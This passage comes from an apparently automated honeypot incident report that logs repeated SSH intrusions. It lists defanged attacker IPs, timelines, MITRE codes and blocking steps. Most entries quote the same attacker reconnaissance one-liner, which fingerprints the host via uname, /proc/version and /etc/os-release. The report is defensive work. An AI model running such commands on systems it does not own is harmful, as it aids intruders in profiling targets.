| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:27:57` | `cowrie.session.connect` |
| `2026-07-12 17:27:57` | `cowrie.client.version` |
| `2026-07-12 17:27:57` | `cowrie.client.kex` |
| `2026-07-12 17:27:58` | `cowrie.login.success` |
| `2026-07-12 17:27:59` | `cowrie.session.params` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:27:59` | `cowrie.command.success` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:27:59` | `cowrie.command.input` |
| `2026-07-12 17:28:00` | `cowrie.log.closed` |
| `2026-07-12 17:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6785a105a5e3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:28 |
| **Last Seen** | 2026-07-12 17:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:28:15` | `cowrie.session.connect` |
| `2026-07-12 17:28:16` | `cowrie.client.version` |
| `2026-07-12 17:28:16` | `cowrie.client.kex` |
| `2026-07-12 17:28:21` | `cowrie.login.success` |
| `2026-07-12 17:28:22` | `cowrie.session.params` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.command.success` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.command.input` |
| `2026-07-12 17:28:22` | `cowrie.log.closed` |
| `2026-07-12 17:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e71f52185a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:28 |
| **Last Seen** | 2026-07-12 17:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:28:27` | `cowrie.session.connect` |
| `2026-07-12 17:28:27` | `cowrie.client.version` |
| `2026-07-12 17:28:27` | `cowrie.client.kex` |
| `2026-07-12 17:28:29` | `cowrie.login.success` |
| `2026-07-12 17:28:30` | `cowrie.session.params` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.command.success` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.command.input` |
| `2026-07-12 17:28:30` | `cowrie.log.closed` |
| `2026-07-12 17:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c852e211cc7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:30 |
| **Last Seen** | 2026-07-12 17:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:30:03` | `cowrie.session.connect` |
| `2026-07-12 17:30:03` | `cowrie.client.version` |
| `2026-07-12 17:30:03` | `cowrie.client.kex` |
| `2026-07-12 17:30:04` | `cowrie.login.success` |
| `2026-07-12 17:30:05` | `cowrie.session.params` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.command.success` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.command.input` |
| `2026-07-12 17:30:05` | `cowrie.log.closed` |
| `2026-07-12 17:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c35c6af5b313

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:30 |
| **Last Seen** | 2026-07-12 17:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:30:22` | `cowrie.session.connect` |
| `2026-07-12 17:30:23` | `cowrie.client.version` |
| `2026-07-12 17:30:23` | `cowrie.client.kex` |
| `2026-07-12 17:30:28` | `cowrie.login.success` |
| `2026-07-12 17:30:29` | `cowrie.session.params` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:29` | `cowrie.command.success` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:29` | `cowrie.command.input` |
| `2026-07-12 17:30:30` | `cowrie.log.closed` |
| `2026-07-12 17:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-372654bb54e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:30 |
| **Last Seen** | 2026-07-12 17:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:30:34` | `cowrie.session.connect` |
| `2026-07-12 17:30:35` | `cowrie.client.version` |
| `2026-07-12 17:30:35` | `cowrie.client.kex` |
| `2026-07-12 17:30:36` | `cowrie.login.success` |
| `2026-07-12 17:30:37` | `cowrie.session.params` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.command.success` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.command.input` |
| `2026-07-12 17:30:37` | `cowrie.log.closed` |
| `2026-07-12 17:30:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d956cedd1172

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:32 |
| **Last Seen** | 2026-07-12 17:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:32:20` | `cowrie.session.connect` |
| `2026-07-12 17:32:22` | `cowrie.client.version` |
| `2026-07-12 17:32:22` | `cowrie.client.kex` |
| `2026-07-12 17:32:26` | `cowrie.login.success` |
| `2026-07-12 17:32:27` | `cowrie.session.params` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.command.success` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.command.input` |
| `2026-07-12 17:32:27` | `cowrie.log.closed` |
| `2026-07-12 17:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de4f4f56c7f5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:32 |
| **Last Seen** | 2026-07-12 17:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:32:23` | `cowrie.session.connect` |
| `2026-07-12 17:32:23` | `cowrie.client.version` |
| `2026-07-12 17:32:23` | `cowrie.client.kex` |
| `2026-07-12 17:32:24` | `cowrie.login.success` |
| `2026-07-12 17:32:25` | `cowrie.session.params` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.command.success` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.command.input` |
| `2026-07-12 17:32:25` | `cowrie.log.closed` |
| `2026-07-12 17:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3689d73d8dd8

| Field | Detail |
|---|---|
| **Source IP** | `37.238.45[.]202` |
| **First Seen** | 2026-07-12 17:32 |
| **Last Seen** | 2026-07-12 17:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:32:38` | `cowrie.session.connect` |
| `2026-07-12 17:32:38` | `cowrie.client.version` |
| `2026-07-12 17:32:38` | `cowrie.client.kex` |
| `2026-07-12 17:32:39` | `cowrie.login.success` |
| `2026-07-12 17:32:40` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.238.45[.]202` to AbuseIPDB if not already reported
- [ ] Block `37.238.45[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8489bdedf65a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:32 |
| **Last Seen** | 2026-07-12 17:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:32:44` | `cowrie.session.connect` |
| `2026-07-12 17:32:45` | `cowrie.client.version` |
| `2026-07-12 17:32:45` | `cowrie.client.kex` |
| `2026-07-12 17:32:45` | `cowrie.login.success` |
| `2026-07-12 17:32:47` | `cowrie.session.params` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.command.success` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.command.input` |
| `2026-07-12 17:32:47` | `cowrie.log.closed` |
| `2026-07-12 17:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ccc64688eaa

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 17:33 |
| **Last Seen** | 2026-07-12 17:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:33:27` | `cowrie.session.connect` |
| `2026-07-12 17:33:28` | `cowrie.client.version` |
| `2026-07-12 17:33:28` | `cowrie.client.kex` |
| `2026-07-12 17:33:31` | `cowrie.login.success` |
| `2026-07-12 17:33:32` | `cowrie.session.params` |
| `2026-07-12 17:33:32` | `cowrie.command.input` |
| `2026-07-12 17:33:32` | `cowrie.log.closed` |
| `2026-07-12 17:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb31916d377

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:34 |
| **Last Seen** | 2026-07-12 17:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:34:04` | `cowrie.session.connect` |
| `2026-07-12 17:34:05` | `cowrie.client.version` |
| `2026-07-12 17:34:05` | `cowrie.client.kex` |
| `2026-07-12 17:34:09` | `cowrie.login.success` |
| `2026-07-12 17:34:09` | `cowrie.session.params` |
| `2026-07-12 17:34:09` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.command.success` |
| `2026-07-12 17:34:10` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.command.input` |
| `2026-07-12 17:34:10` | `cowrie.log.closed` |
| `2026-07-12 17:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d621d13b1b7b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:34 |
| **Last Seen** | 2026-07-12 17:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:34:54` | `cowrie.session.connect` |
| `2026-07-12 17:34:54` | `cowrie.client.version` |
| `2026-07-12 17:34:54` | `cowrie.client.kex` |
| `2026-07-12 17:34:55` | `cowrie.login.success` |
| `2026-07-12 17:34:57` | `cowrie.session.params` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.command.success` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.command.input` |
| `2026-07-12 17:34:57` | `cowrie.log.closed` |
| `2026-07-12 17:34:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d18a88c8626

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:35 |
| **Last Seen** | 2026-07-12 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
